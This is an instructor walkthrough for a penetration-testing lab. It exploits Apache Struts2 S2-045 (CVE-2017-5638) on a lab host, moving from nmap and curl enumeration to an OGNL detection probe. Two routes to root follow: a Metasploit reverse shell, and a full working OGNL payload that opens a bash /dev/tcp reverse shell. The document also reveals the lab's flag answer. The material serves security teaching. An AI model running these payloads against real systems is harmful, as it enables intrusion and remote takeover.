---
id: B02.M07-walkthrough
title: Chicago — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/01-target1-struts2.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Chicago — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Chicago Module (`B02.M07`). Students know only the assigned subnet `192.168.10.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.10.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T1_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `curl` (for web enumeration and payload delivery)
* `nc` (Netcat, for catching the reverse shell)
* `metasploit-framework` (section 4 automated path via `exploit/multi/http/struts2_content_type_ognl`)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.10.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.10.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.10.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.10.10
Host is up (0.00021s latency).
```

**Observation:** One live host responds on this subnet: **192.168.10.10**.

**Inference:** That address is the candidate to enumerate. We still know nothing about services or software.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.10.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.10.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. An open port labeled only `http` is not enough to research; we need the product and version string (here, **Jetty 9.2.11**).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

*Output excerpt:*
```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.2.11.v20150529
```

**Observation:** A single open port — **8080/tcp** — identified as HTTP on **Jetty 9.2.11.v20150529**.

**Inference:** This is a Java HTTP stack, but Jetty alone does not name the application framework. Next, fetch the root page and read what it claims to be. Use port **8080** in the URL because that is the only listener nmap found (not 80).

### Initial Web Probing

nmap told us HTTP on 8080. Confirm that in the HTTP conversation: response headers (container) and the HTML (application name and forms).

```bash
curl -s -D - http://192.168.10.10:8080/ -o /tmp/t1-root.html | head -12
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter so the output is just headers/body.
* `-D -` — write response **headers** to stdout (`-` means stdout). That is where `Server` / cookies show up.
* `-o /tmp/t1-root.html` — write the **body** to a file so we can inspect the HTML without mixing it into the header dump.
* `| head -12` — only the first header lines; we care about status and `Server`, not a long dump.

*Header excerpt:*
```text
HTTP/1.1 200 OK
Content-Type: text/html; charset=ISO-8859-1
Set-Cookie: JSESSIONID=...;Path=/
Server: Jetty(9.2.11.v20150529)
```

The saved HTML is a full Struts showcase page. We do not need every tag. We need **what the app calls itself** and **whether it exposes an upload form**, because those two facts decide what to research next.

```bash
grep -iE 'title|h1|form|enctype|action=|type="file"' /tmp/t1-root.html
```

*Why these patterns:*

* `grep -iE` — case-insensitive extended regex, so `Title` and `title` both match.
* `title` / `h1` — page identity. That is how we learn this is **Struts2 Showcase**, not a blank Jetty index.
* `form` / `enctype` / `action=` — how the page sends data, and to which path.
* `type="file"` — a file input means this is an **upload** demo, not a login box.

We are not hunting a random string. Those fields are the usual “what is this web app?” cuts on an HTML form page.

*Body excerpt:*
```html
<title>Struts2 Showcase - Fileupload sample</title>
<h1>Fileupload sample</h1>
<form id="doUpload" name="doUpload" action="/doUpload.action;jsessionid=..." method="POST" enctype="multipart/form-data">
<input type="file" name="upload" value="" id="doUpload_upload"/>
<input type="text" name="caption" value="" id="doUpload_caption"/>
```

**Observation:** The page title names **Struts2 Showcase** and a **Fileupload sample**. The form posts to `/doUpload.action` with `enctype="multipart/form-data"` and a file input.

**Inference:** This is an Apache Struts 2 demo focused on file upload, not a generic Jetty index. Searching with only those page facts — `Struts2 Showcase Fileupload sample` — lands on the Struts showcase / file-upload documentation ([File Upload](https://struts.apache.org/core-developers/file-upload)). Struts file upload depends on parsing `multipart/form-data`, which starts from the request's `Content-Type` header (including its boundary).

**Candidate selection:** Struts2 has had many unrelated RCE classes (parameter OGNL, REST plugin, etc.). This page is built to exercise **upload**, so the multipart / `Content-Type` parsing path is the first surface to test — before unrelated Struts bugs that this demo does not advertise.

## 3. Vulnerability Discovery

We now know:

* The product is **Apache Struts 2** (showcase upload demo)
* The interesting surface is **multipart file upload** (`enctype="multipart/form-data"`, `/doUpload.action`)
* The container is **Jetty** on port **8080**

Searching from those facts — `struts2 multipart Content-Type OGNL` or `struts2 jakarta multipart parser RCE` — surfaces the Jakarta Multipart parser flaw **S2-045** / **CVE-2017-5638** ([S2-045](https://struts.apache.org/docs/s2-045.html)).

**What the bug is:** Struts uses **OGNL** (Object-Graph Navigation Language) as an expression language inside the framework. When a request looks like a multipart upload, the **Jakarta multipart parser** reads the `Content-Type` header. In vulnerable versions, a malformed `Content-Type` is evaluated as OGNL during error handling. You do **not** need to POST a file. A crafted `Content-Type` on an ordinary request to `/` is enough to hit the parser.

That is the research result. Next we **prove** this host evaluates OGNL that way, using a public detection payload — not a reverse shell yet.

### Detection probe (public S2-045 check)

The long `Content-Type` line is **not** something we invented for this lab. It is the standard S2-045 *detection* PoC used in the Vulhub environment (`vulnhub/struts2/s2-045/README.md`) and in public write-ups: OGNL in `Content-Type` that calls `HttpServletResponse.addHeader(...)` with the canary expression `233*233`, then a suffix that still looks like multipart (`...}.multipart/form-data`).

What each piece is doing:

* `%{ ... }` — Struts OGNL wrapper; the parser is tricked into evaluating the string.
* `addHeader('X-Vuln-Check', 233*233)` — run the math, put the result in an HTTP **response** header. `233*233 = 54289` is a canary so a hit is obvious.
* **`X-Vuln-Check`** — a **name we chose** for that response header so we can spot it. The public PoCs use the same `addHeader` trick with various names (`X-Test-...`, `X-Cmd-Response`, and so on). The name is arbitrary; the math in the header value is what proves evaluation.
* `.multipart/form-data` on the end — keeps `Content-Type` looking like a multipart upload so the Jakarta parser actually handles it.

`curl -I` sends a **HEAD** request and prints response headers only. The canary lives in a header, so we do not need the HTML body.

Same contrast as a closed vs open switch: send the OGNL **without** the multipart suffix first. The parser should ignore it.

```bash
curl -s -I "http://192.168.10.10:8080/" \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vuln-Check',233*233)}"
```

*Output excerpt:*
```text
HTTP/1.1 200 OK
Content-Type: text/html; charset=ISO-8859-1
Server: Jetty(9.2.11.v20150529)
```

**Observation:** No `X-Vuln-Check` header.

**Inference:** OGNL in `Content-Type` alone is not enough. The value still has to look like multipart.

Now the public PoC shape — same OGNL, with the `.multipart/form-data` suffix:

```bash
curl -s -I "http://192.168.10.10:8080/" \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vuln-Check',233*233)}.multipart/form-data"
```

*Output excerpt:*
```text
HTTP/1.1 200 OK
X-Vuln-Check: 54289
Server: Jetty(9.2.11.v20150529)
```

**Observation:** The response includes `X-Vuln-Check: 54289` — exactly `233*233`.

**Inference:** The server **evaluated** our OGNL and wrote the result into the header we named. That is expression execution on the S2-045 path. A shell is the same channel with a larger OGNL payload (section 5) or Metasploit (section 4).

## 4. Automated Path: Metasploit

Product + confirmed `Content-Type` OGNL evaluation is enough to look for an existing exploit. In `msfconsole`:

```text
msf6 > search cve:2017-5638

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/struts2_content_type_ognl  2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
```

(The same module is findable with `search struts2_content_type`.)

The module defaults to `TARGETURI=/struts2-showcase/`. This lab serves the showcase at **`/`**, so a check with the default path does not reliably confirm the target:

```text
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.10.10
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 8080
msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 192.168.100.1
msf6 exploit(multi/http/struts2_content_type_ognl) > set LPORT 4444
msf6 exploit(multi/http/struts2_content_type_ognl) > check
[*] 192.168.10.10:8080 - Cannot reliably check exploitability.
```

*What we learned:* Match `TARGETURI` to the path we already saw in the HTML (`/` and `/doUpload.action`), not the module's showcase default.

Working options:

```bash
msfconsole -q
```

```text
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.10.10
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 8080
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 192.168.100.1
msf6 exploit(multi/http/struts2_content_type_ognl) > set LPORT 4444
msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(multi/http/struts2_content_type_ognl) > check
[+] 192.168.10.10:8080 - The target is vulnerable. Successfully executed the injected code
msf6 exploit(multi/http/struts2_content_type_ognl) > run
```

*Output excerpt:*
```text
[*] Started reverse TCP handler on 192.168.100.1:4444
[*] Command shell session 1 opened (192.168.100.1:4444 -> 192.168.10.10:xxxxx)
```

In the session:

```bash
id
cat /flag.txt
```

*Output:*
```text
uid=0(root) gid=0(root) groups=0(root)
crimson-falcon
```

That is a complete automated path to the flag. Section 5 is the same bug without Metasploit.

## 5. Manual Path: Content-Type OGNL reverse shell

The matching Vulhub environment (`vulnhub/struts2/s2-045/README.md`) uses the same header-math check we already ran (`233*233` → `54289`). With detection confirmed, escalate to an OS callback.

Start a Netcat listener on the attacker machine (replace with your lab-facing IP):

```bash
nc -lvnp 4444
```

It is tempting to reuse the short detection pattern with `Runtime.exec`:

```bash
curl -s -I "http://192.168.10.10:8080/" \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Result',@java.lang.Runtime@getRuntime().exec('id'))}.multipart/form-data"
```

*Output excerpt:*
```text
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Jetty(9.2.11.v20150529)
```

No useful `Result` header, and no command output.

*What we learned:* Struts2's OGNL security manager (`SecurityMemberAccess`) blocks direct use of dangerous classes such as `java.lang.Runtime`. A longer public S2-045 payload is required: clear excluded packages/classes, restore default member access, then run the command via `ProcessBuilder`.

The following `PAYLOAD` is a standard public CVE-2017-5638 / S2-045 vector (Exploit-DB / common GitHub PoCs; Vulhub documents the same class of `Content-Type` OGNL abuse in `vulnhub/struts2/s2-045/README.md`). High-level stages:

1. Force the multipart parser path (`#nike='multipart/form-data'`).
2. Obtain default member access and clear OGNL exclusion lists via `OgnlUtil`.
3. Build a `ProcessBuilder` for `/bin/bash -c` with the reverse shell command.
4. Copy process streams to the HTTP response (the reverse shell still connects out to our listener).

```bash
LHOST="192.168.100.1"   # change to your attacker IP
LPORT="4444"
REVCMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

PAYLOAD="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\"$REVCMD\").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

curl -s "http://192.168.10.10:8080/" -H "Content-Type: $PAYLOAD"
```

Check the Netcat listener for a root shell:

```text
listening on [any] 4444 ...
connect to [192.168.100.1] from (UNKNOWN) [192.168.10.10] 59528
root@ac4d30738783:/usr/src#
```

From the reverse shell (or the Metasploit session in section 4):

```bash
cat /flag.txt
```

*Output:*
```text
crimson-falcon
```

Target 1 is complete.
